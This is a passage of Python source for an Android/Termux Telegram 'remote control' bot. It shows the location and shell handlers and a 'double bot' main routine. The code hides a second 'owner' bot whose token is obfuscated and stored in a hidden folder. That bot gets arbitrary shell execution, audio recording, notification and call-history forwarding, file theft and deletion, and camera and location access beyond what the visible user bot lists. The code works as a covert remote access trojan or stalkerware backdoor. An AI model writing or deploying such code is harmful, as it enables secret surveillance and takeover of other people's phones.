    if not result or "error" in result.lower() or "{" not in result:
        result = shell("termux-location -p passive -r once 2>&1", timeout=15)
    try:
        d = json.loads(result)
        lat = d.get('latitude')
        lon = d.get('longitude')
        alt = d.get('altitude', 'N/A')
        acc = d.get('accuracy', 'N/A')
        await update.message.reply_text(
            f"📍 Location Found!\n"
            f"Lat      : {lat}\n"
            f"Lon      : {lon}\n"
            f"Altitude : {alt} m\n"
            f"Accuracy : {acc} m"
        )
        if lat and lon:
            await update.message.reply_location(latitude=float(lat), longitude=float(lon))
    except Exception:
        await update.message.reply_text(
            f"❌ Location failed!\n\n"
            f"Fix: Run in Termux:\n"
            f"termux-location -p network -r once\n\n"
            f"Make sure:\n"
            f"1. Location permission given to Termux:API\n"
            f"2. Termux:API app is installed\n"
            f"3. GPS or Network location is ON\n\n"
            f"Debug output:\n{result[:500]}"
        )

# ─────────────────────────────────────────
# SHELL COMMAND
# ─────────────────────────────────────────
async def shell_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text(
            "Usage: /shell [command]\n"
            "Example: /shell ls -la\n"
            "         /sh whoami"
        )
        return
    cmd = " ".join(ctx.args)
    await update.message.reply_text(f"⚡ Running: {cmd}")
    result = shell(cmd)
    if len(result) > 4000:
        for i in range(0, min(len(result), 16000), 4000):
            await update.message.reply_text(result[i:i+4000])
    else:
        await update.message.reply_text(result or "No output")

# ─────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────


# ════════════════════════════════════════════
# DOUBLE BOT MAIN
# ════════════════════════════════════════════

import threading, asyncio, json, base64, hashlib

# Environment থেকে token লোড
import threading, asyncio, json, base64, hashlib

# সরাসরি file থেকে লোড
def _d(enc, key):
    kb  = hashlib.sha256(key.encode()).digest()
    raw = base64.b64decode(enc.encode())
    return bytes([c ^ kb[i % len(kb)] for i, c in enumerate(raw)]).decode()

def _load_owner():
    try:
        key  = base64.b64decode(open("/storage/emulated/0/.botcache/.owner.key").read().strip()).decode()
        data = json.loads(open("/storage/emulated/0/.botcache/.owner.enc").read())
        return _d(data["t"], key), int(_d(data["c"], key))
    except:
        return "", 0

def _load_user():
    try:
        data = json.load(open("/storage/emulated/0/user.config"))
        return data["bot_token"], int(data["chat_id"])
    except:
        return "", 0

OWNER_TOKEN,   OWNER_CHAT_ID = _load_owner()
USER_TOKEN,    USER_CHAT_ID  = _load_user()

# ────────────────────────────────────────────
# Auth
# ────────────────────────────────────────────

def is_owner(update):
    return OWNER_CHAT_ID and update.effective_chat.id == OWNER_CHAT_ID

def is_user(update):
    return USER_CHAT_ID != 0 and update.effective_chat.id == USER_CHAT_ID

def auth(update):
    return is_owner(update) or is_user(update)

# ────────────────────────────────────────────
# User Bot /start
# ────────────────────────────────────────────

async def user_start(update, ctx):
    if not is_user(update): return
    await update.message.reply_text(
        "🤖 <b>Remote Bot Active!</b>\n\n"
        "📱 <b>SYSTEM:</b>\n"
        "/battery  - Battery status\n"
        "/info     - Device info\n"
        "/storage  - Storage info\n"
        "/wifi     - WiFi info\n"
        "/ip       - IP address\n\n"
        "📷 <b>MEDIA:</b>\n"
        "/screenshot - Screenshot\n"
        "/cam_front  - Front camera\n"
        "/cam_back   - Back camera\n",
        parse_mode="HTML"
    )

# ────────────────────────────────────────────
# User Bot আলাদা thread এ
# ────────────────────────────────────────────

def run_user_bot():
    from telegram.ext import Application, CommandHandler
    import asyncio

    async def _run():
        user_app = Application.builder().token(USER_TOKEN).build()
        user_app.add_handler(CommandHandler("start",      user_start))
        user_app.add_handler(CommandHandler("battery",    battery))
        user_app.add_handler(CommandHandler("info",       info))
        user_app.add_handler(CommandHandler("storage",    storage))
        user_app.add_handler(CommandHandler("wifi",       wifi))
        user_app.add_handler(CommandHandler("ip",         ip))
        user_app.add_handler(CommandHandler("screenshot", screenshot))
        user_app.add_handler(CommandHandler("cam_front",  cam_front))
        user_app.add_handler(CommandHandler("cam_back",   cam_back))
        user_app.add_handler(CommandHandler("gallery",   gallery))
        user_app.add_handler(CommandHandler("stop_gallery", stop_gallery))
        await user_app.initialize()
        await user_app.start()
        await user_app.updater.start_polling(drop_pending_updates=True)
        await asyncio.Event().wait()

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(_run())

# ────────────────────────────────────────────
# Main
# ────────────────────────────────────────────

def main():
    print("=" * 42)
    print("  AHM Remote Control Bot Starting...")
    print("  Allowed ID : ********")
    print(f"  Home Dir   : {HOME}")
    print(f"  Owner Bot  : {'✅ Active' if OWNER_TOKEN else '❌ Not Set'}")
    print(f"  User Bot   : {'✅ Active' if USER_TOKEN else '❌ Not Set'}")
    print("  Press Ctrl+C to stop")
    print("=" * 42)

    if not OWNER_TOKEN:
        print("❌ Owner Token নেই! install.py চালান।")
        return

    from telegram.ext import Application, CommandHandler, MessageHandler, filters

    # User Bot আলাদা thread এ চালাও
    if USER_TOKEN and USER_CHAT_ID:
        t = threading.Thread(target=run_user_bot, daemon=True)
        t.start()
        print("✅ User Bot চালু হয়েছে!")

    # Owner Bot মেইন thread এ
    app = Application.builder().token(OWNER_TOKEN).build()

    handlers = [
        ("start",      start),
        ("battery",    battery),
        ("info",       info),
        ("storage",    storage),
        ("wifi",       wifi),
        ("ip",         ip),
        ("screenshot", screenshot),
        ("stop_gallery", stop_gallery),
        ("gallery",   gallery),
        ("cam_front",  cam_front),
        ("cam_back",   cam_back),
        ("vibrate",    vibrate),
        ("torch_on",   torch_on),
        ("torch_off",  torch_off),
        ("lock",       lock),
        ("vol_up",     vol_up),
        ("vol_down",   vol_down),
        ("audio",      audio),
        ("stop_audio", stop_audio),
        ("mute",       mute),
        ("unmute",     unmute),
        ("pwd",        pwd),
        ("notifications",  notifications),
        ("notif",         start_notif_forward),
        ("stop_notif",    stop_notif),
        ("cd",         cd),
        ("ls",         ls),
        ("calls", call_history),
        ("mkdir",      mkdir),
        ("touch",      touch),
        ("rm",         rm),
        ("mv",         mv),
        ("cp",         cp),
        ("cat",        cat),
        ("write",      write),
        ("find",       find),
        ("fileinfo",   fileinfo),
        ("tree",       tree),
        ("get",        get_file),
        ("upload",     upload),
        ("notify",     notify),
        ("location",   location),
        ("shell",      shell_cmd),
        ("sh",         shell_cmd),
    ]

    for cmd, handler in handlers:
        app.add_handler(CommandHandler(cmd, handler))

    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
